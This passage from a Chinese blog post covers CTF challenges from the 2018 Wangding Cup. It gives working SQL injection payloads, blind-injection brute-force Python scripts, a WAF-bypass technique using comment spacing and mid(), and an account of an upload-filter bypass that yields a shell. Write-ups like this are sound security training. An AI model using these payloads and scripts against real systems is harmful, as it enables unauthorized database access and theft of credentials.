<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">'%2B(select substr(hex(hex((select * from flag))) from 1 for 10))%2B'</span><span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>本来想附上我的脚本的，但是题目环境关了，脚本有点小bug，看看哪天环境有开在改吧。我的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 存在bug的脚本</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re,binascii</span><br><span class="line">login_url = <span class="string">"http://aad6cdfbfad34a09b7f947a852b226c4758d9b48816d48e9.game.ichunqiu.com/login.php"</span></span><br><span class="line">register_url = <span class="string">"http://aad6cdfbfad34a09b7f947a852b226c4758d9b48816d48e9.game.ichunqiu.com/register.php"</span></span><br><span class="line"></span><br><span class="line">users_email = [<span class="string">"test0"</span> + str(i) + <span class="string">"@qq.com"</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">17</span>)]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(user_email,offset)</span>:</span></span><br><span class="line">    reg_datas = &#123;</span><br><span class="line">        <span class="string">"email"</span> : user_email,</span><br><span class="line">        <span class="string">"username"</span> : <span class="string">"0'+(select substr(hex(hex((select * from flag))) from "</span> + str(<span class="number">1</span>+offset*<span class="number">10</span>)+ <span class="string">" for 10))+'0"</span>,</span><br><span class="line">        <span class="string">"password"</span> : <span class="string">"test"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(reg_datas['username'])</span></span><br><span class="line">    r = requests.post(url = register_url,data = reg_datas)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(user_email)</span>:</span></span><br><span class="line">    login_datas = &#123;</span><br><span class="line">        <span class="string">"email"</span> : user_email,</span><br><span class="line">        <span class="string">"password"</span> : <span class="string">"test"</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url = login_url,data = login_datas,allow_redirects=<span class="keyword">True</span>)</span><br><span class="line">    pattern = <span class="string">'&lt;span class=\"user-name\"&gt;\s*(\d&#123;1,10&#125;)\s*&lt;'</span></span><br><span class="line">    <span class="keyword">return</span> re.findall(pattern,r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    flag_double_hex = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> email,offset <span class="keyword">in</span> zip(users_email,range(<span class="number">0</span>,len(users_email))):</span><br><span class="line">        register(email,offset)</span><br><span class="line">        test = login(email)</span><br><span class="line">        print(test)</span><br><span class="line">        flag_double_hex += test</span><br><span class="line">        print(<span class="string">"[-] "</span> + flag_double_hex,end=<span class="string">"\r"</span>,flush=<span class="keyword">True</span>)</span><br><span class="line">    print(<span class="string">"[+] "</span> + flag_double_hex.decode(<span class="string">'hex'</span>).decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure>
<p>下面再贴一个 <strong>virink</strong> 师傅的脚本，运行过可以获取flag，SQL语句和我不一样，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">URL = <span class="string">'http://99836af07612423cb83b84745ccd56dcd11ede0687854475.game.ichunqiu.com'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(email)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"email"</span>: email,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = req.post(URL + <span class="string">'/login.php'</span>, data)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'1          &lt;/span&gt;'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(u, e)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: u,</span><br><span class="line">        <span class="string">"email"</span>: e,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = req.post(URL + <span class="string">'/register.php'</span>, data, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line">        <span class="keyword">return</span> login(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">table = <span class="string">'qwertyuiopasdfghjklzxcvbnm'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(pl)</span>:</span></span><br><span class="line">    email = <span class="string">''</span>.join(random.sample(table, <span class="number">8</span>)) + <span class="string">'@qq.com'</span></span><br><span class="line">    <span class="keyword">return</span> reg(pl, email)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLen</span><span class="params">(sql)</span>:</span></span><br><span class="line">    print(<span class="string">"[+] Starting getLen..."</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">        sys.stdout.write(<span class="string">"[+] Len : -&gt; %d &lt;-\r"</span> % i)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">if</span> b(<span class="string">"1'and((select length((%s)))=%d)and'1"</span> % (sql, i)):</span><br><span class="line">            print(<span class="string">"[+] Len : -&gt; %d &lt;-"</span> % i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(sql=<span class="string">"version()"</span>)</span>:</span></span><br><span class="line">    _len = getLen(sql)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> _len:</span><br><span class="line">        print(<span class="string">"[-] getLen 'Error'"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    print(<span class="string">"[+] Starting getData..."</span>)</span><br><span class="line">    table = <span class="string">'&#125;&#123;1234567890.-@_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>, _len + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> table:</span><br><span class="line">            sys.stdout.write(<span class="string">"[+] Result : -&gt; %s%c &lt;-\r"</span> % (res, ch))</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            pl = <span class="string">"1'and((select substr((%s)from(%d)for(1))='%s'))and'1"</span> % (</span><br><span class="line">                sql, pos, ch)</span><br><span class="line">            <span class="keyword">if</span> b(pl):</span><br><span class="line">                res += ch</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"[+] Result : -&gt; %s &lt;- "</span> % res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># right(left(x,pos),1)</span></span><br><span class="line"><span class="comment"># mid(x,pos,1)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># pl = "(select substr((version())from(1)for(1))='%s')" % '5'</span></span><br><span class="line">    <span class="comment"># pl = "1'and(%s)and'1" % pl</span></span><br><span class="line">    <span class="comment"># print(b(pl))</span></span><br><span class="line">    pl = <span class="string">'version()'</span></span><br><span class="line">    pl = <span class="string">'select t.c from (select (select 1)c union select * from flag)t limit 1 offset 1'</span></span><br><span class="line">    getData(pl)</span><br></pre></td></tr></table></figure>
<h3 id="wafUpload"><a href="#wafUpload" class="headerlink" title="wafUpload"></a>wafUpload</h3><p>题目代码如下：<br><img src="/img/2018网鼎杯第二场/13.png" alt="13"></p>
<p>据说是 <strong>pwnhub</strong> 题目改的，不过没找到，直接来分析代码吧。上图代码 <strong>第8-10行</strong> 进行了 <strong>MIME</strong> 类型检测， <strong>第12-20行</strong> 对文件后缀进行了检测，而后缀名则是取 <strong>$file</strong> 数组中最后一个元素。然后在生成文件的时候，文件路径又用 <strong>$file</strong> 数组第一个元素做文件名，数组最后一个下标对应的值作为后缀，这明显存在不一致可绕过的问题。我们只要控制 <strong>$file</strong> 数组中参数的顺序即可绕过并 <strong>getshell</strong> ，请求数据包如下：</p>
<p><img src="/img/2018网鼎杯第二场/14.png" alt="14"></p>
<p><img src="/img/2018网鼎杯第二场/15.png" alt="15"></p>
<p>PS：赛后得知题目出自这里： <a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html#0x05-getshell" target="_blank" rel="noopener">phpjiami 数种解密方法</a> </p>
<h3 id="sqlweb"><a href="#sqlweb" class="headerlink" title="sqlweb"></a>sqlweb</h3><p>题目：admin也拿不到flag喔(●’◡’●) </p>
<p><img src="/img/2018网鼎杯第二场/16.png" alt="16"></p>
<p>打开 <strong>BurpSuite</strong> <strong>Fuzz</strong> 发现提示信息，过滤了以下关键字：</p>
<p><img src="/img/2018网鼎杯第二场/17.png" alt="17"></p>
<p><strong>admin账号</strong> 可以用弱密码登陆： <strong>admin/admin123</strong> </p>
<p><img src="/img/2018网鼎杯第二场/18.png" alt="18"></p>
<p>发现新提示，说只有 <strong>wuyanzu</strong> 用户才能拿到 <strong>flag</strong> 。至此，思路就很清晰了，<strong>flag</strong> 应该就是 <strong>wuyanzu</strong> 用户的密码，或者 <strong>wuyanzu</strong> 用户登陆后就能看到 <strong>flag</strong> ，所以这题就是考察绕过 <strong>WAF</strong> 进行 <strong>SQL注入</strong> 。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waf:/sleep|benchmark|=|like|regexp|<span class="keyword">and</span>|\|%|substr|union|\s+|group|floor|user|extractvalue|UpdateXml|ord|lpad|rpad|left|&gt;|,|ascii/i  !!! (trust me,no one can bypass it)</span><br></pre></td></tr></table></figure>
<p>仔细观察上面的 <strong>WAF</strong> ，过滤了空格，可以用 <strong>/**/</strong> 来绕过；过滤了 <strong>and</strong> ，可以用 <strong>&amp;&amp;</strong> 代替；过滤了 <strong>substr</strong> 、 <strong>ascii</strong> ，但是还可以用 <strong>mid</strong> 。而且SQL语句执行和不执行返回的长度是不一样的。所以我们构造 <strong>payload</strong> 如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wuyanzu'<span class="comment">/**/</span>%26%26<span class="comment">/**/</span>mid(passwd<span class="comment">/**/</span>from<span class="comment">/**/</span>1<span class="comment">/**/</span>for<span class="comment">/**/</span>1)<span class="comment">/**/</span>in<span class="comment">/**/</span>('f')<span class="comment">/**/</span>limit<span class="comment">/**/</span>1%23</span><br></pre></td></tr></table></figure>
<p>编写获取flag的程序如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">chars = <span class="string">"&#125;&#123;-0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">url = <span class="string">"http://902f59bfbb134985aeef8fb606e07c77373dedd3ef0e4bca.game.ichunqiu.com//sql.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        datas = &#123;</span><br><span class="line">            <span class="string">"uname"</span> : <span class="string">"wuyanzu'/**/&amp;&amp;/**/mid(passwd/**/from/**/"</span> + str(i) +<span class="string">"/**/for/**/1)/**/in/**/('"</span> + char + <span class="string">"')/**/limit/**/1#"</span>,</span><br><span class="line">            <span class="string">"passwd"</span> : <span class="string">"rte"</span>,</span><br><span class="line">            <span class="string">"submit"</span> : <span class="string">"login"</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url = url, data = datas)</span><br><span class="line">        <span class="keyword">if</span> len(r.text) == <span class="number">75</span>:</span><br><span class="line">            flag += char</span><br><span class="line">            print(<span class="string">"[-] "</span> + flag,end=<span class="string">"\r"</span>,flush=<span class="keyword">True</span>)</span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">'&#125;'</span>:</span><br><span class="line">                print(<span class="string">"[+] "</span> + flag)</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>
<p><img src="/img/2018网鼎杯第二场/19.png" alt="19"></p>

        
      
    </div>

    

    

  </article>

    
  </section>

  
  <nav class="pagination">
    
    
      <a class="next" href="/page/2/">
        <span class="next-text">下一页</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>


          </div>
          

        </div>
      </main>

      <footer id="footer" class="footer">

  <div class="social-links">
    
      
        
          <a href="mailto:379032449@qq.com" class="iconfont icon-email" title="email"></a>
        
      
    
      
    
      
    
      
    
      
    
      
    
      
        
          <a href="https://github.com/Mochazz/" class="iconfont icon-github" title="github"></a>
        
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
    
  </div>


<div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">
    
    &copy; 
     
      2017 - 
    
    2018

    <span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">Mochazz</span>
  </span>
</div>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>

    


    






  
    <script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  

  
    <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  

  

  

  


    <script type="text/javascript" src="/js/src/even.js?v=2.6.0"></script>

  </body>
</html>
